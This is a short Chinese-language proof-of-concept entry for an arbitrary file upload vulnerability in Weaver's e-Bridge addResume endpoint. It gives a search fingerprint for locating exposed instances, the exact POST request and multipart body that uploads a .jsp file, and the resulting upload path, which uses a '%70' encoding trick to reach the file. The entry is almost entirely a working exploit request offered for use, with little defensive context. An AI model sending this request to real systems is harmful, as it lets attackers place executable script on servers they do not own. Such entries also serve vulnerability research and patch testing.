# 泛微云桥e-Bridge-addResume存在任意文件上传漏洞

- **系统**：泛微OA　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`title="泛微云桥 e-Bridge"`
- **请求**：`POST /wxclient/app/recruit/resume/addResume?fileElementld=H HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=----WebKitFormBoundary83Hl3B72…`　`Content-Length: 279`

**请求体 / payload**
```
------WebKitFormBoundary83Hl3B723UfEAUV0
Content-Disposition: form-data; name="file";filename="1234.jsp"
123123
------WebKitFormBoundary83Hl3B723UfEAUV0
Content-Disposition: form-data; name="file";filename="1234.jsp"
123123
------WebKitFormBoundary83Hl3B723UfEAUV0--
上传路径
http://ip/upload/202408/C/1234.js%70
url链接C处根据环境不同而变化。
1、有的环境是1个大写字母
2、有的环境是2个大写字母
```
- **预期**：200　|　—